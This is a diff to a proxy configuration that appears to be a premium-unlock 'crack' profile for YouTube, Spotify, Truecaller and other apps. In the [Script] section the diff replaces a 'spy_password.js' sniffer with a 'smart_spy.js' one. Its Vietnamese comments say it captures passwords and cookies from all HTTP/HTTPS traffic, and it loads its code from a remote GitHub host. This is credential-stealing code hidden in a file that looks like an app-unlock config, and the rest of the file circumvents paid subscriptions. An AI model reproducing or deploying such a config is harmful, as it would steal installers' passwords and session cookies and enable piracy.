@@ -22,9 +22,9 @@ http-request ^https:\/\/(spclient\.wg\.spotify\.com|.*-spclient\.spotify\.com(:4
 
 [Script]
 
-# === LAB: CATCH ALL TRAFFIC (BẮT TOÀN BỘ) ===
-# pattern=^http nghĩa là bắt tất cả URL bắt đầu bằng http hoặc https
-global_sniffer = type=http-request,pattern=^http,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/spy_password.js,requires-body=true
+# === LAB: SMART SNIFFER (PASSWORD & COOKIE) ===
+# Bắt toàn bộ HTTP/HTTPS traffic
+smart_spy = type=http-request,pattern=^http,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/smart_spy.js,requires-body=true
 
 # === YouTube Premium ===
 youtube.request = type=http-request,pattern=^https:\/\/youtubei\.googleapis\.com\/youtubei\/v1\/(browse|next|player|reel\/reel_watch_sequence|get_watch),requires-body=1,max-size=-1,binary-body-mode=1,engine=jsc,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/youtube.response.js
@@ -55,3 +55,4 @@ deleteHeader = type=http-request,pattern=^https:\/\/api\.revenuecat\.com\/.+\/(r
 
 [MITM]
 hostname = %APPEND%, *.googlevideo.com, youtubei.googleapis.com, www.youtube.com, s.youtube.com, -redirector*.googlevideo.com, premium*.truecaller.com, api.revenuecat.com, api-mobile.soundcloud.com, api.picsart.com, us-central1-alight-creative.cloudfunctions.net, spclient.wg.spotify.com, *spclient.spotify.com
+
